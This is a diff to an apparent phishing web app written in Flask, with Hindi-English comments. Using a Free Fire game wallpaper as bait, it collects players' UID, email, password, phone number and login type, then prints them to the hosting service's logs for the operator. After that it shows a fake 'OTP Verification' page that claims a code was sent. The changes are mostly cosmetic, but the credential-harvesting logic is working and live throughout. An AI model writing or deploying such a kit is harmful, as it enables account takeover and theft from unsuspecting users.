@@ -2,10 +2,10 @@ from flask import Flask, request, render_template_string
 
 app = Flask(__name__)
 
-# 1. Background Wallpaper Link (Jo aapne photo di thi)
-BG_URL = "https://i.pinimg.com/736x/87/4c/7a/874c7a6e16543b573e04746f3938561d.jpg"
+# 1. Aapka PostImages wala Direct Link (Screenshot ke mutabik)
+BG_URL = "https://i.postimg.cc/zXQBBdsW/1868470-1080x1920-samsung-full-hd-garena-free-fire-wallpaper-photo.jpg"
 
-# 2. Main Page Design
+# 2. Page Design
 HTML_TEMPLATE = f'''
 <!DOCTYPE html>
 <html>
@@ -20,8 +20,8 @@ HTML_TEMPLATE = f'''
             display: flex; justify-content: center; align-items: center; min-height: 100vh;
         }}
         .form-box {{
-            background: rgba(255, 255, 255, 0.98); padding: 25px; border-radius: 15px;
-            text-align: center; width: 330px; box-shadow: 0 10px 30px rgba(0,0,0,0.7);
+            background: rgba(255, 255, 255, 0.96); padding: 25px; border-radius: 15px;
+            text-align: center; width: 320px; box-shadow: 0 10px 30px rgba(0,0,0,0.8);
         }}
         input, select {{ 
             width: 100%; padding: 12px; margin: 10px 0; 
@@ -29,7 +29,7 @@ HTML_TEMPLATE = f'''
         }}
         .blue-btn {{ 
             background: #1a73e8; color: white; border: none; padding: 15px; 
-            width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer;
+            width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; width: 100%;
         }}
     </style>
 </head>
@@ -58,7 +58,7 @@ HTML_TEMPLATE = f'''
 def home():
     return render_template_string(HTML_TEMPLATE)
 
-# 3. PREVIEW PAGE (User apna ID/Password yahan dekh sakega)
+# 3. PREVIEW PAGE (User details verify karega)
 @app.route('/preview', methods=['POST'])
 def preview():
     uid = request.form.get('uid')
@@ -69,14 +69,14 @@ def preview():
 
     return f'''
     <body style="background-image: url('{BG_URL}'); background-size: cover; display: flex; justify-content: center; align-items: center; min-height: 100vh; font-family: sans-serif;">
-        <div style="background: white; padding: 25px; border-radius: 15px; width: 320px; text-align: center;">
-            <h3 style="color: red;">Verify Your Details</h3>
-            <div style="text-align: left; background: #eee; padding: 15px; border-radius: 8px; font-size: 14px;">
+        <div style="background: white; padding: 25px; border-radius: 15px; width: 300px; text-align: center;">
+            <h3 style="color: red;">Confirm Details</h3>
+            <div style="text-align: left; background: #f0f0f0; padding: 15px; border-radius: 8px; font-size: 14px;">
                 <p><b>UID:</b> {uid}</p>
                 <p><b>Email:</b> {email}</p>
                 <p><b>Password:</b> <span style="color:blue;">{password}</span></p>
                 <p><b>Phone:</b> {phone}</p>
-                <p><b>Login Type:</b> {acc}</p>
+                <p><b>Login:</b> {acc}</p>
             </div>
             <form action="/submit_final" method="post">
                 <input type="hidden" name="uid" value="{uid}">
@@ -90,7 +90,7 @@ def preview():
     </body>
     '''
 
-# 4. SUBMIT (Render Logs mein data yahan se dikhega)
+# 4. FINAL SUBMIT (Render Logs mein data dikhega)
 @app.route('/submit_final', methods=['POST'])
 def submit_final():
     uid = request.form.get('uid')
@@ -101,16 +101,12 @@ def submit_final():
 
     # Dashboard.render.com ke Logs mein ye dikhega
     print("\n" + "🎯" * 10)
-    print(f"ID: {uid}")
-    print(f"MAIL: {email}")
-    print(f"PASS: {password}")
-    print(f"PH: {phone}")
-    print(f"TYPE: {acc}")
+    print(f"ID: {uid} | MAIL: {email} | PASS: {password} | PH: {phone} | TYPE: {acc}")
     print("🎯" * 10 + "\n")
 
     return f'''
     <body style="background-image: url('{BG_URL}'); background-size: cover; display: flex; justify-content: center; align-items: center; min-height: 100vh; font-family: sans-serif;">
-        <div style="background: white; padding: 25px; border-radius: 15px; width: 320px; text-align: center;">
+        <div style="background: white; padding: 25px; border-radius: 15px; width: 300px; text-align: center;">
             <h2>OTP Verification</h2>
             <p>8-Digit code sent to {phone}</p>
             <form action="/final_otp" method="post">
